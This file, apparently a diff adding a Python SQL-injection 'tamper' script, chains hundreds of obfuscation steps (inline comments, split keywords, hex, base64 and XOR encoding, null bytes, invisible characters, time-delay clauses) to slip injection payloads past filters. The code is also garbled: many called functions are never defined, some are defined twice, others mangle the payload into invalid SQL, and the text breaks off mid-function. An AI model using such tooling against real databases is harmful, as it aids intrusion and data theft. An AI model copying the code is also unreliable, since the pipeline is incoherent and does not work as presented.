@@ -1,0 +1,1653 @@
+import random
+import string
+import urllib.parse
+import re
+import base64
+
+def tamper(payload, **kwargs):
+    if payload:
+        payload = payload.replace(" ", "/**/")
+        payload = add_random_comments(payload)
+        payload = payload.replace("SELECT", "SEL/**/ECT")
+        payload = payload.replace("UNION", "UNI/**/ON")
+        payload = payload.replace("FROM", "FR/**/OM")
+        payload = payload.replace("WHERE", "WHE/**/RE")
+        payload = payload.replace("AND", "A/**/ND")
+        payload = payload.replace("OR", "O/**/R")
+        payload = hex_encode_strings(payload)
+        payload = add_mysql_comments(payload)
+        payload = shuffle_sql(payload)
+        payload = partial_url_encode(payload)
+        payload = regex_obfuscate(payload)
+        payload = add_random_parameters(payload)
+        payload = use_alternate_syntax(payload)
+        payload = add_sql_whitespace(payload)
+        payload = add_inline_comments(payload)
+        payload = add_special_chars(payload)
+        payload = use_different_keywords(payload)
+        payload = use_non_standard_syntax(payload)
+        payload = octal_encode_strings(payload)
+        payload = alternate_case(payload)
+        payload = use_double_expressions(payload)
+        payload = add_paragraphs(payload)
+        payload = add_empty_strings(payload)
+        payload = base64_encode_strings(payload)
+        payload = separate_syntax(payload)
+        payload = add_unicode_chars(payload)
+        payload = add_invisible_whitespace(payload)
+        payload = ascii_encode_strings(payload)
+        payload = add_random_spaces(payload)
+        payload = add_hidden_keywords(payload)
+        payload = add_control_chars(payload)
+        payload = add_dataset_chars(payload)
+        payload = use_keyword_abbreviations(payload)
+        payload = add_null_bytes(payload)
+        payload = binary_encode_strings(payload)
+        payload = add_math_expressions(payload)
+        payload = use_stored_procedures(payload)
+        payload = use_secure_functions(payload)
+        payload = use_secure_replacements(payload)
+        payload = use_different_collation(payload)
+        payload = support_different_sql_dialects(payload)
+        payload = xor_encode_strings(payload)
+        payload = break_character_consolidation(payload)
+        payload = add_sql_sleep(payload)
+        payload = add_sql_waitfor(payload)
+        payload = add_sql_comments(payload)
+        payload = use_boolean_expression(payload)
+        payload = use_string_concatenation(payload)
+        payload = use_procedural_syntax(payload)
+        payload = add_false_condition(payload)
+        payload = add_user_defined_functions(payload)
+        payload = add_sql_case_when(payload)
+        payload = use_concat_null(payload)
+        payload = use_ifnull(payload)
+        payload = use_cast(payload)
+        payload = use_coalesce(payload)
+        payload = use_nvl(payload)
+        payload = use_declare(payload)
+        payload = use_merge(payload)
+        payload = add_time_delay(payload)
+        payload = add_hex_comment(payload)
+        payload = use_nested_queries(payload)
+        payload = use_explain(payload)
+        payload = use_union_null(payload)
+        payload = use_division(payload)
+        payload = use_bitwise(payload)
+        payload = add_sp_password(payload)
+        payload = add_sp_executesql(payload)
+        payload = use_string_aggregation(payload)
+        payload = use_dynamic_sql(payload)
+        payload = use_sql_variant(payload)
+        payload = use_xml(payload)
+        payload = use_json(payload)
+        payload = use_row_number(payload)
+        payload = use_order_by(payload)
+        payload = use_group_by(payload)
+        payload = add_outer_join(payload)
+        payload = use_cross_join(payload)
+        payload = add_inner_join(payload)
+        payload = use_substring(payload)
+        payload = use_hashbytes(payload)
+        payload = use_openquery(payload)
+        payload = use_opendatasource(payload)
+        payload = use_isnull(payload)
+        payload = use_nullif(payload)
+        payload = use_patindex(payload)
+        payload = use_sp_help(payload)
+        payload = use_sp_tables(payload)
+        payload = use_sp_columns(payload)
+        payload = use_sp_statistics(payload)
+        payload = use_sp_indexes(payload)
+        payload = use_like(payload)
+        payload = use_in(payload)
+        payload = use_between(payload)
+        payload = use_exists(payload)
+        payload = use_any(payload)
+        payload = use_all(payload)
+        payload = use_intersect(payload)
+        payload = use_except(payload)
+        payload = use_cross_apply(payload)
+        payload = use_outer_apply(payload)
+        payload = use_pivot(payload)
+        payload = use_unpivot(payload)
+        payload = use_with_cte(payload)
+        payload = use_recursive_cte(payload)
+        payload = use_derived_table(payload)
+        payload = use_ctas(payload)
+        payload = use_insert_into(payload)
+        payload = use_bulk_insert(payload)
+        payload = use_merge_into(payload)
+        payload = use_update(payload)
+        payload = use_delete(payload)
+        payload = use_truncate(payload)
+        payload = use_comment(payload)
+        payload = use_set(payload)
+        payload = use_backup_database(payload)
+        payload = use_restore_database(payload)
+        payload = use_dbcc(payload)
+        payload = use_exec(payload)
+        payload = use_sp_executesql_with_params(payload)
+        payload = use_cast_as_varchar(payload)
+        payload = use_cast_as_int(payload)
+        payload = use_cast_as_date(payload)
+        payload = use_cast_as_time(payload)
+        payload = use_cast_as_float(payload)
+        payload = use_rand_function(payload)
+        payload = use_bin_function(payload)
+        payload = use_char_function(payload)
+        payload = use_length_function(payload)
+        payload = use_left_function(payload)
+        payload = use_right_function(payload)
+        payload = use_locate_function(payload)
+        payload = use_instr_function(payload)
+        payload = use_strcmp_function(payload)
+        payload = use_replace_function(payload)
+        payload = use_lpad_function(payload)
+        payload = use_rpad_function(payload)
+        payload = use_bit_length_function(payload)
+        payload = use_ascii_function(payload)
+        payload = use_quotename_function(payload)
+        payload = use_charindex_function(payload)
+        payload = use_translate_function(payload)
+        payload = use_replace_function(payload)
+        payload = use_replicate_function(payload)
+        payload = use_space_function(payload)
+        payload = use_reverse_function(payload)
+        payload = use_repeat_function(payload)
+        payload = use_char_length_function(payload)
+        payload = use_soundex_function(payload)
+        payload = use_difference_function(payload)
+        payload = use_stuff_function(payload)
+        payload = use_substr_function(payload)
+        payload = use_ucase_function(payload)
+        payload = use_lcase_function(payload)
+        payload = use_hex_function(payload)
+        payload = use_unhex_function(payload)
+        payload = use_format_function(payload)
+        payload = use_md5_function(payload)
+        payload = use_sha1_function(payload)
+        payload = use_sha2_function(payload)
+        payload = use_encrypt_function(payload)
+        payload = use_encryptaes_function(payload)
+        payload = use_decrypt_function(payload)
+        payload = use_decryptaes_function(payload)
+        payload = use_encryptmd5_function(payload)
+        payload = use_bitwise_and(payload)
+        payload = use_bitwise_or(payload)
+        payload = use_bitwise_xor(payload)
+        payload = use_bitwise_not(payload)
+        payload = use_ror_function(payload)
+        payload = use_rol_function(payload)
+        payload = use_crc32_function(payload)
+        payload = use_password_function(payload)
+        payload = use_old_password_function(payload)
+        payload = use_sha_function(payload)
+        payload = use_sha2_function(payload)
+        payload = use_encrypt_function(payload)
+        payload = use_decrypt_function(payload)
+        payload = use_rand_function(payload)
+        payload = use_floor_function(payload)
+        payload = use_ceil_function(payload)
+        payload = use_round_function(payload)
+        payload = use_truncate_function(payload)
+        payload = use_pi_function(payload)
+        payload = use_exp_function(payload)
+        payload = use_ln_function(payload)
+        payload = use_log_function(payload)
+        payload = use_log2_function(payload)
+        payload = use_log10_function(payload)
+        payload = use_pow_function(payload)
+        payload = use_sqrt_function(payload)
+        payload = use_acos_function(payload)
+        payload = use_asin_function(payload)
+        payload = use_atan_function(payload)
+        payload = use_atan2_function(payload)
+        payload = use_cos_function(payload)
+        payload = use_cot_function(payload)
+        payload = use_degrees_function(payload)
+        payload = use_radians_function(payload)
+        payload = use_sin_function(payload)
+        payload = use_tan_function(payload)
+        payload = use_rpad_function(payload)
+        payload = use_lpad_function(payload)
+        payload = use_space_function(payload)
+        payload = use_strcmp_function(payload)
+        payload = use_field_function(payload)
+        payload = use_make_set_function(payload)
+        payload = use_find_in_set_function(payload)
+        payload = use_insert_function(payload)
+        payload = use_interval_function(payload)
+        payload = use_json_value(payload)
+        payload = use_json_query(payload)
+        payload = use_json_modify(payload)
+        payload = use_json_array(payload)
+        payload = use_json_object(payload)
+        payload = use_json_each(payload)
+        payload = use_json_extract(payload)
+        payload = use_json_array_append(payload)
+        payload = use_json_array_insert(payload)
+        payload = use_json_merge(payload)
+        payload = use_json_remove(payload)
+        payload = use_json_set(payload)
+        payload = use_json_type(payload)
+        payload = use_json_unquote(payload)
+        payload = use_json_valid(payload)
+        payload = use_bool_and(payload)
+        payload = use_bool_or(payload)
+        payload = use_bool_xor(payload)
+        payload = use_bool_not(payload)
+        payload = use_logical_and(payload)
+        payload = use_logical_or(payload)
+        payload = use_logical_xor(payload)
+        payload = use_logical_not(payload)
+        payload = use_compress(payload)
+        payload = use_uncompress(payload)
+        payload = use_uncompressed_length(payload)
+        payload = use_to_base64(payload)
+        payload = use_from_base64(payload)
+        payload = use_setvalue(payload)
+        payload = use_getvalue(payload)
+        payload = use_any_value(payload)
+        payload = use_concat_ws(payload)
+        payload = use_concat_ws_distinct(payload)
+        payload = use_crc32(payload)
+        payload = use_validatetime(payload)
+        payload = use_validdate(payload)
+        payload = use_validtimestamp(payload)
+        payload = use_validdecimal(payload)
+        payload = use_validnumber(payload)
+        payload = use_validfloat(payload)
+        payload = use_validepoch(payload)
+        payload = use_validmd5(payload)
+        payload = use_validsha1(payload)
+        payload = use_validsha2(payload)
+        payload = use_validencrypt(payload)
+        payload = use_validdecrypt(payload)
+        payload = use_validbase64(payload)
+        payload = use_validbinary(payload)
+        payload = use_validhex(payload)
+        payload = use_validoctal(payload)
+        payload = use_validboolean(payload)
+        payload = use_validvarchar(payload)
+        payload = use_validtext(payload)
+        payload = use_validchar(payload)
+        payload = use_validblob(payload)
+        payload = use_validclob(payload)
+        payload = use_validxml(payload)
+        payload = use_validjson(payload)
+        payload = use_validarray(payload)
+        payload = use_validset(payload)
+        payload = use_validmulti(payload)
+        payload = use_validvector(payload)
+        payload = use_validobject(payload)
+        payload = use_validhash(payload)
+        payload = use_validrecord(payload)
+        payload = use_validtable(payload)
+        payload = use_validview(payload)
+        payload = use_validindex(payload)
+        payload = use_validschema(payload)
+        payload = use_validcatalog(payload)
+        payload = use_validrole(payload)
+        payload = use_validsequence(payload)
+        payload = use_validtrigger(payload)
+        payload = use_validprocedure(payload)
+        payload = use_validfunction(payload)
+        payload = use_validsynonym(payload)
+        payload = use_validmaterialized_view(payload)
+        payload = use_validdatadictionary(payload)
+        payload = use_validmetadata(payload)
+        payload = use_validdictionary(payload)
+        payload = use_validkeyword(payload)
+        payload = use_validexpression(payload)
+        payload = use_validquery(payload)
+        payload = use_validstatement(payload)
+        payload = use_validtransaction(payload)
+        payload = use_validsession(payload)
+        payload = use_validlogin(payload)
+        payload = use_validconnection(payload)
+        payload = use_validresource(payload)
+        payload = use_validprivilege(payload)
+        payload = use_validgrant(payload)
+        payload = use_validrole(payload)
+        payload = use_validpolicy(payload)
+        payload = use_validconstraint(payload)
+        payload = use_validindex_type(payload)
+        payload = use_validindex_mode(payload)
+        payload = use_validindex_partition(payload)
+        payload = use_validindex_subpartition(payload)
+        payload = use_validindex_segment(payload)
+        payload = use_validindex_maintenance(payload)
+        payload = use_validindex_organization(payload)
+        payload = use_validindex_storage(payload)
+        payload = use_validindex_compression(payload)
+        payload = use_validindex_logging(payload)
+        payload = use_validindex_monitoring(payload)
+        payload = use_validindex_synchronization(payload)
+        payload = use_validindex_visibility(payload)
+        payload = use_validindex_filter(payload)
+        payload = use_validindex_sample(payload)
+        payload = use_validindex_parallel(payload)
+        payload = use_validindex_allocation(payload)
+        payload = use_validindex_type(payload)
+        payload = use_validindex_status(payload)
+        payload = use_validindex_stats(payload)
+        payload = use_validindex_hint(payload)
+        payload = use_validindex_expression(payload)
+        payload = use_validindex_column(payload)
+        payload = use_validindex_order(payload)
+        payload = use_validindex_sort(payload)
+        payload = use_validindex_limit(payload)
+        payload = use_validindex_rows(payload)
+        payload = use_validindex_blocks(payload)
+        payload = use_validindex_extent(payload)
+        payload = use_validindex_degree(payload)
+        payload = use_validindex_inmemory(payload)
+        payload = use_validindex_nologging(payload)
+        payload = use_validindex_statistics(payload)
+        payload = use_validindex_storage_attributes(payload)
+        payload = use_validindex_subpartition(payload)
+        payload = use_validindex_subpartition_name(payload)
+        payload = use_validindex_tablespace(payload)
+        payload = use_validindex_tablespace_name(payload)
+        payload = use_validindex_visibility(payload)
+        payload = use_validindex_volume(payload)
+        payload = use_validindex_workload(payload)
+        payload = use_validindex_zone(payload)
+        payload = add_confusion_chars(payload)
+        payload = use_random_delimiters(payload)
+        payload = add_sql_injection_patterns(payload)
+        payload = add_case_variation(payload)
+        payload = replace_keywords_with_synonyms(payload)
+        payload = use_regex_escape(payload)
+        payload = add_spaceless_obfuscation(payload)
+        payload = add_encoding_variations(payload)
+        payload = use_double_quotes(payload)
+        payload = use_single_quotes(payload)
+        payload = use_numeric_obfuscation(payload)
+        payload = use_substring_obfuscation(payload)
+        payload = use_function_obfuscation(payload)
+        payload = use_comment_obfuscation(payload)
+        payload = use_string_interpolation(payload)
+        payload = use_alias_obfuscation(payload)
+        payload = use_char_obfuscation(payload)
+        payload = use_cast_obfuscation(payload)
+        payload = use_type_conversion(payload)
+        payload = use_nested_comments(payload)
+        payload = use_randomized_case(payload)
+        payload = use_function_splitting(payload)
+        payload = use_function_shuffling(payload)
+        payload = use_alternate_function_calls(payload)
+        payload = add_noop_statements(payload)
+        payload = add_recursive_comments(payload)
+        payload = add_dummy_functions(payload)
+        payload = add_duplicate_keywords(payload)
+        payload = add_superfluous_keywords(payload)
+        payload = add_sql_version_function(payload)
+        payload = add_user_function_calls(payload)
+        payload = add_execution_time(payload)
+    return payload
+
+def add_random_comments(payload):
+    parts = payload.split(" ")
+    tampered_parts = []
+    for part in parts:
+        if random.choice([True, False]):
+            tampered_parts.append(part + "/*" + ''.join(random.choices(string.ascii_letters, k=5)) + "*/")
+        else:
+            tampered_parts.append(part)
+    return " ".join(tampered_parts)
+
+def hex_encode_strings(payload):
+    def hex_encode(match):
+        return '0x' + match.group(1).encode('utf-8').hex()
+    return re.sub(r'\'([^\']*)\'', hex_encode, payload)
+
+def add_mysql_comments(payload):
+    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
+    for keyword in keywords:
+        payload = payload.replace(keyword, f"{keyword}-- ")
+    return payload
+
+def shuffle_sql(payload):
+    parts = payload.split(" ")
+    random.shuffle(parts)
+    return " ".join(parts)
+
+def partial_url_encode(payload):
+    parts = payload.split(" ")
+    encoded_parts = []
+    for part in parts:
+        if random.choice([True, False]):
+            encoded_parts.append(urllib.parse.quote(part))
+        else:
+            encoded_parts.append(part)
+    return " ".join(encoded_parts)
+
+def regex_obfuscate(payload):
+    transformations = [
+        (r"SELECT", "SEL(?:ECT|ECT)"),
+        (r"UNION", "UNI(?:ON|ON)"),
+        (r"FROM", "FR(?:OM|OM)"),
+        (r"WHERE", "WHE(?:RE|RE)"),
+        (r"AND", "A(?:ND|ND)"),
+        (r"OR", "O(?:R|R)")
+    ]
+    for pattern, replacement in transformations:
+        payload = re.sub(pattern, replacement, payload, flags=re.IGNORECASE)
+    return payload
+
+def add_random_parameters(payload):
+    params = ["user()", "version()", "database()"]
+    random_param = random.choice(params)
+    return payload + " AND " + random_param + " = " + random_param
+
+def use_alternate_syntax(payload):
+    payload = payload.replace("=", "LIKE")
+    payload = payload.replace("SELECT", "SEL/*comment*/ECT")
+    payload = payload.replace("UNION", "UNION ALL")
+    return payload
+
+def add_sql_whitespace(payload):
+    payload = payload.replace(" ", "\t")
+    payload = payload.replace(" ", "\n")
+    return payload
+
+def add_inline_comments(payload):
+    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
+    for keyword in keywords:
+        payload = payload.replace(keyword, f"{keyword}/**/")
+    return payload
+
+def add_special_chars(payload):
+    special_chars = ['#', '$', '%', '&']
+    tampered_payload = ''
+    for char in payload:
+        if random.choice([True, False]):
+            tampered_payload += random.choice(special_chars)
+        tampered_payload += char
+    return tampered_payload
+
+def use_different_keywords(payload):
+    payload = payload.replace("SELECT", "SELLECT")
+    payload = payload.replace("UNION", "UNIONN")
+    payload = payload.replace("FROM", "FRM")
+    payload = payload.replace("WHERE", "WHRE")
+    payload = payload.replace("AND", "ANNDD")
+    payload = payload.replace("OR", "OOR")
+    return payload
+
+def use_non_standard_syntax(payload):
+    payload = payload.replace("1=1", "1<=>1")
+    payload = payload.replace("=", "LIKE BINARY")
+    return payload
+
+def octal_encode_strings(payload):
+    def octal_encode(match):
+        return ''.join(['\\%o' % ord(char) for char in match.group(1)])
+    return re.sub(r'\'([^\']*)\'', octal_encode, payload)
+
+def alternate_case(payload):
+    return ''.join([char.upper() if random.choice([True, False]) else char.lower() for char in payload])
+
+def use_double_expressions(payload):
+    payload = payload.replace("1=1", "1=1 AND 2=2")
+    payload = payload.replace("SELECT", "(SELECT SELECT)")
+    return payload
+
+def add_paragraphs(payload):
+    return payload.replace(" ", "\n")
+
+def add_empty_strings(payload):
+    return payload.replace(" ", "''")
+
+def base64_encode_strings(payload):
+    def base64_encode(match):
+        return base64.b64encode(match.group(1).encode()).decode()
+    return re.sub(r'\'([^\']*)\'', base64_encode, payload)
+
+def separate_syntax(payload):
+    payload = payload.replace("SELECT", "(SEL)ECT")
+    payload = payload.replace("UNION", "(UNI)ON")
+    payload = payload.replace("FROM", "(FR)OM")
+    payload = payload.replace("WHERE", "(WHE)RE")
+    payload = payload.replace("AND", "(A)ND")
+    payload = payload.replace("OR", "(O)R")
+    return payload
+
+def add_unicode_chars(payload):
+    unicode_chars = ['\u200B', '\u200C', '\u200D']
+    tampered_payload = ''
+    for char in payload:
+        if random.choice([True, False]):
+            tampered_payload += random.choice(unicode_chars)
+        tampered_payload += char
+    return tampered_payload
+
+def add_invisible_whitespace(payload):
+    whitespace_chars = ['\u200B', '\u200C', '\u200D']
+    return ''.join([char + random.choice(whitespace_chars) if random.choice([True, False]) else char for char in payload])
+
+def ascii_encode_strings(payload):
+    def ascii_encode(match):
+        return ''.join(['&#%d;' % ord(char) for char in match.group(1)])
+    return re.sub(r'\'([^\']*)\'', ascii_encode, payload)
+
+def add_random_spaces(payload):
+    tampered_payload = ''
+    for char in payload:
+        if random.choice([True, False]):
+            tampered_payload += ' '
+        tampered_payload += char
+    return tampered_payload
+
+def add_hidden_keywords(payload):
+    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
+    for keyword in keywords:
+        payload = payload.replace(keyword, f"/*!{keyword}*/")
+    return payload
+
+def add_control_chars(payload):
+    control_chars = ['\x00', '\x01', '\x02', '\x03', '\x04']
+    tampered_payload = ''
+    for char in payload:
+        if random.choice([True, False]):
+            tampered_payload += random.choice(control_chars)
+        tampered_payload += char
+    return tampered_payload
+
+def add_dataset_chars(payload):
+    dataset_chars = ['/*', '*/']
+    tampered_payload = ''
+    for char in payload:
+        if random.choice([True, False]):
+            tampered_payload += random.choice(dataset_chars)
+        tampered_payload += char
+    return tampered_payload
+
+def use_keyword_abbreviations(payload):
+    payload = payload.replace("SELECT", "SEL")
+    payload = payload.replace("UNION", "UNI")
+    payload = payload.replace("FROM", "FR")
+    payload = payload.replace("WHERE", "WH")
+    payload = payload.replace("AND", "AN")
+    payload = payload.replace("OR", "O")
+    return payload
+
+def add_null_bytes(payload):
+    return ''.join([char + '\x00' if random.choice([True, False]) else char for char in payload])
+
+def binary_encode_strings(payload):
+    def binary_encode(match):
+        return ' '.join(format(ord(char), 'b') for char in match.group(1))
+    return re.sub(r'\'([^\']*)\'', binary_encode, payload)
+
+def add_math_expressions(payload):
+    payload = payload.replace("1=1", "1=1 AND 1+1=2")
+    payload = payload.replace("2=2", "2=2 AND 2*2=4")
+    return payload
+
+def use_stored_procedures(payload):
+    return payload + " EXEC sp_helpdb"
+
+def use_secure_functions(payload):
+    payload = payload.replace("SELECT", "SECURE_SELECT")
+    return payload
+
+def use_secure_replacements(payload):
+    payload = payload.replace("'", "REPLACE(')")
+    return payload
+
+def use_different_collation(payload):
+    payload = payload + " COLLATE utf8_general_ci"
+    return payload
+
+def support_different_sql_dialects(payload):
+    dialects = ["/*+postgres*/", "/*+oracle*/", "/*+sqlserver*/"]
+    return payload + " " + random.choice(dialects)
+
+def xor_encode_strings(payload):
+    def xor_encode(match):
+        return ''.join([chr(ord(char) ^ 0x20) for char in match.group(1)])
+    return re.sub(r'\'([^\']*)\'', xor_encode, payload)
+
+def break_character_consolidation(payload):
+    special_chars = ['_', '~', '^']
+    return ''.join([char + random.choice(special_chars) if random.choice([True, False]) else char for char in payload])
+
+def add_sql_sleep(payload):
+    return payload + " SLEEP(5)"
+
+def add_sql_waitfor(payload):
+    return payload + " WAITFOR DELAY '00:00:05'"
+
+def add_sql_comments(payload):
+    return payload + " --"
+
+def use_boolean_expression(payload):
+    return payload.replace("1=1", "1=1 AND 1=1")
+
+def use_string_concatenation(payload):
+    return payload.replace("SELECT", "SEL" + "ECT")
+
+def use_procedural_syntax(payload):
+    return payload + " CALL my_procedure()"
+
+def add_false_condition(payload):
+    return payload + " AND 1=0"
+
+def add_user_defined_functions(payload):
+    return payload + " my_function()"
+
+def add_sql_case_when(payload):
+    return payload + " CASE WHEN 1=1 THEN 'A' ELSE 'B' END"
+
+def use_concat_null(payload):
+    return payload + " CONCAT(NULL, 'A')"
+
+def use_ifnull(payload):
+    return payload + " IFNULL(NULL, 'A')"
+
+def use_cast(payload):
+    return payload + " CAST('123' AS INTEGER)"
+
+def use_coalesce(payload):
+    return payload + " COALESCE(NULL, 'A')"
+
+def use_nvl(payload):
+    return payload + " NVL(NULL, 'A')"
+
+def use_declare(payload):
+    return payload + " DECLARE @var INT"
+
+def use_merge(payload):
+    return payload + " MERGE INTO target USING source ON condition"
+
+def add_time_delay(payload):
+    return payload + " WAITFOR DELAY '0:0:5'"
+
+def add_hex_comment(payload):
+    return payload + " -- 0x0a"
+
+def use_nested_queries(payload):
+    return payload + " (SELECT * FROM (SELECT * FROM table) AS subquery)"
+
+def use_explain(payload):
+    return payload + " EXPLAIN SELECT * FROM table"
+
+def use_union_null(payload):
+    return payload + " UNION ALL SELECT NULL"
+
+def use_division(payload):
+    return payload + " 1/1"
+
+def use_bitwise(payload):
+    return payload + " 1 | 0"
+
+def add_sp_password(payload):
+    return payload + " EXEC sp_password NULL, 'password', 'user'"
+
+def add_sp_executesql(payload):
+    return payload + " EXEC sp_executesql N'SELECT * FROM table'"
+
+def use_string_aggregation(payload):
+    return payload + " STRING_AGG(column, ',')"
+
+def use_dynamic_sql(payload):
+    return payload + " EXEC ('SELECT * FROM table')"
+
+def use_sql_variant(payload):
+    return payload + " SQL_VARIANT_PROPERTY('value', 'BaseType')"
+
+def use_xml(payload):
+    return payload + " FOR XML PATH"
+
+def use_json(payload):
+    return payload + " FOR JSON PATH"
+
+def use_row_number(payload):
+    return payload + " ROW_NUMBER() OVER (ORDER BY column)"
+
+def use_order_by(payload):
+    return payload + " ORDER BY column"
+
+def use_group_by(payload):
+    return payload + " GROUP BY column"
+
+def add_outer_join(payload):
+    return payload + " LEFT OUTER JOIN table ON condition"
+
+def use_cross_join(payload):
+    return payload + " CROSS JOIN table"
+
+def add_inner_join(payload):
+    return payload + " INNER JOIN table ON condition"
+
+def use_substring(payload):
+    return payload + " SUBSTRING(column, 1, 1)"
+
+def use_hashbytes(payload):
+    return payload + " HASHBYTES('SHA1', 'value')"
+
+def use_openquery(payload):
+    return payload + " OPENQUERY(linked_server, 'SELECT * FROM table')"
+
+def use_opendatasource(payload):
+    return payload + " OPENDATASOURCE('SQLNCLI', 'Data Source=server;')"
+
+def use_isnull(payload):
+    return payload + " ISNULL(column, 'default')"
+
+def use_nullif(payload):
+    return payload + " NULLIF(column, 'value')"
+
+def use_patindex(payload):
+    return payload + " PATINDEX('%pattern%', column)"
+
+def use_sp_help(payload):
+    return payload + " EXEC sp_help"
+
+def use_sp_tables(payload):
+    return payload + " EXEC sp_tables"
+
+def use_sp_columns(payload):
+    return payload + " EXEC sp_columns"
+
+def use_sp_statistics(payload):
+    return payload + " EXEC sp_statistics"
+
+def use_sp_indexes(payload):
+    return payload + " EXEC sp_indexes"
+
+def use_like(payload):
+    return payload + " LIKE '%value%'"
+
+def use_in(payload):
+    return payload + " IN (1, 2, 3)"
+
+def use_between(payload):
+    return payload + " BETWEEN 1 AND 10"
+
+def use_exists(payload):
+    return payload + " EXISTS (SELECT 1)"
+
+def use_any(payload):
+    return payload + " > ANY (SELECT 1)"
+
+def use_all(payload):
+    return payload + " > ALL (SELECT 1)"
+
+def use_intersect(payload):
+    return payload + " INTERSECT"
+
+def use_except(payload):
+    return payload + " EXCEPT"
+
+def use_cross_apply(payload):
+    return payload + " CROSS APPLY"
+
+def use_outer_apply(payload):
+    return payload + " OUTER APPLY"
+
+def use_pivot(payload):
+    return payload + " PIVOT"
+
+def use_unpivot(payload):
+    return payload + " UNPIVOT"
+
+def use_with_cte(payload):
+    return payload + " WITH CTE AS (SELECT 1)"
+
+def use_recursive_cte(payload):
+    return payload + " WITH RECURSIVE CTE AS (SELECT 1)"
+
+def use_derived_table(payload):
+    return payload + " (SELECT 1) AS DerivedTable"
+
+def use_ctas(payload):
+    return payload + " CREATE TABLE AS SELECT"
+
+def use_insert_into(payload):
+    return payload + " INSERT INTO table SELECT 1"
+
+def use_bulk_insert(payload):
+    return payload + " BULK INSERT table FROM 'file'"
+
+def use_merge_into(payload):
+    return payload + " MERGE INTO table"
+
+def use_update(payload):
+    return payload + " UPDATE table SET column = 1"
+
+def use_delete(payload):
+    return payload + " DELETE FROM table"
+
+def use_truncate(payload):
+    return payload + " TRUNCATE TABLE table"
+
+def use_comment(payload):
+    return payload + " COMMENT ON TABLE table IS 'comment'"
+
+def use_set(payload):
+    return payload + " SET column = 1"
+
+def use_backup_database(payload):
+    return payload + " BACKUP DATABASE TO DISK"
+
+def use_restore_database(payload):
+    return payload + " RESTORE DATABASE FROM DISK"
+
+def use_dbcc(payload):
+    return payload + " DBCC CHECKDB"
+
+def use_exec(payload):
+    return payload + " EXEC procedure"
+
+def use_sp_executesql_with_params(payload):
+    return payload + " EXEC sp_executesql N'SELECT * FROM table', N'@param1 int', @param1=1"
+
+def use_cast_as_varchar(payload):
+    return payload + " CAST(column AS VARCHAR)"
+
+def use_cast_as_int(payload):
+    return payload + " CAST(column AS INT)"
+
+def use_cast_as_date(payload):
+    return payload + " CAST(column AS DATE)"
+
+def use_cast_as_time(payload):
+    return payload + " CAST(column AS TIME)"
+
+def use_cast_as_float(payload):
+    return payload + " CAST(column AS FLOAT)"
+
+def use_rand_function(payload):
+    return payload + " RAND()"
+
+def use_bin_function(payload):
+    return payload + " BIN(column)"
+
+def use_char_function(payload):
+    return payload + " CHAR(column)"
+
+def use_length_function(payload):
+    return payload + " LENGTH(column)"
+
+def use_left_function(payload):
+    return payload + " LEFT(column, 1)"
+
+def use_right_function(payload):
+    return payload + " RIGHT(column, 1)"
+
+def use_locate_function(payload):
+    return payload + " LOCATE('value', column)"
+
+def use_instr_function(payload):
+    return payload + " INSTR(column, 'value')"
+
+def use_strcmp_function(payload):
+    return payload + " STRCMP(column, 'value')"
+
+def use_replace_function(payload):
+    return payload + " REPLACE(column, 'old', 'new')"
+
+def use_lpad_function(payload):
+    return payload + " LPAD(column, 10, ' ')"
+
+def use_rpad_function(payload):
+    return payload + " RPAD(column, 10, ' ')"
+
+def use_bit_length_function(payload):
+    return payload + " BIT_LENGTH(column)"
+
+def use_ascii_function(payload):
+    return payload + " ASCII(column)"
+
+def use_quotename_function(payload):
+    return payload + " QUOTENAME(column)"
+
+def use_charindex_function(payload):
+    return payload + " CHARINDEX('value', column)"
+
+def use_translate_function(payload):
+    return payload + " TRANSLATE(column, 'old', 'new')"
+
+def use_replace_function(payload):
+    return payload + " REPLACE(column, 'old', 'new')"
+
+def use_replicate_function(payload):
+    return payload + " REPLICATE(column, 2)"
+
+def use_space_function(payload):
+    return payload + " SPACE(10)"
+
+def use_reverse_function(payload):
+    return payload + " REVERSE(column)"
+
+def use_repeat_function(payload):
+    return payload + " REPEAT(column, 2)"
+
+def use_char_length_function(payload):
+    return payload + " CHAR_LENGTH(column)"
+
+def use_soundex_function(payload):
+    return payload + " SOUNDEX(column)"
+
+def use_difference_function(payload):
+    return payload + " DIFFERENCE(column, 'value')"
+
+def use_stuff_function(payload):
+    return payload + " STUFF(column, 1, 1, 'value')"
+
+def use_substr_function(payload):
+    return payload + " SUBSTR(column, 1, 1)"
+
+def use_ucase_function(payload):
+    return payload + " UCASE(column)"
+
+def use_lcase_function(payload):
+    return payload + " LCASE(column)"
+
+def use_hex_function(payload):
+    return payload + " HEX(column)"
+
+def use_unhex_function(payload):
+    return payload + " UNHEX(column)"
+
+def use_format_function(payload):
+    return payload + " FORMAT(column, 2)"
+
+def use_md5_function(payload):
+    return payload + " MD5(column)"
+
+def use_sha1_function(payload):
+    return payload + " SHA1(column)"
+
+def use_sha2_function(payload):
+    return payload + " SHA2(column, 256)"
+
+def use_encrypt_function(payload):
+    return payload + " ENCRYPT(column)"
+
+def use_encryptaes_function(payload):
+    return payload + " ENCRYPTAES(column, 'key')"
+
+def use_decrypt_function(payload):
+    return payload + " DECRYPT(column)"
+
+def use_decryptaes_function(payload):
+    return payload + " DECRYPTAES(column, 'key')"
+
+def use_encryptmd5_function(payload):
+    return payload + " ENCRYPTMD5(column)"
+
+def use_bitwise_and(payload):
+    return payload + " column & 1"
+
+def use_bitwise_or(payload):
+    return payload + " column | 1"
+
+def use_bitwise_xor(payload):
+    return payload + " column ^ 1"
+
+def use_bitwise_not(payload):
+    return payload + " ~column"
+
+def use_ror_function(payload):
+    return payload + " ROR(column, 1)"
+
+def use_rol_function(payload):
+    return payload + " ROL(column, 1)"
+
+def use_crc32_function(payload):
+    return payload + " CRC32(column)"
+
+def use_password_function(payload):
+    return payload + " PASSWORD(column)"
+
+def use_old_password_function(payload):
+    return payload + " OLD_PASSWORD(column)"
+
+def use_sha_function(payload):
+    return payload + " SHA(column)"
+
+def use_sha2_function(payload):
+    return payload + " SHA2(column, 256)"
+
+def use_encrypt_function(payload):
+    return payload + " ENCRYPT(column)"
+
+def use_decrypt_function(payload):
+    return payload + " DECRYPT(column)"
+
+def use_rand_function(payload):
+    return payload + " RAND()"
+
+def use_floor_function(payload):
+    return payload + " FLOOR(column)"
+
+def use_ceil_function(payload):
+    return payload + " CEIL(column)"
+
+def use_round_function(payload):
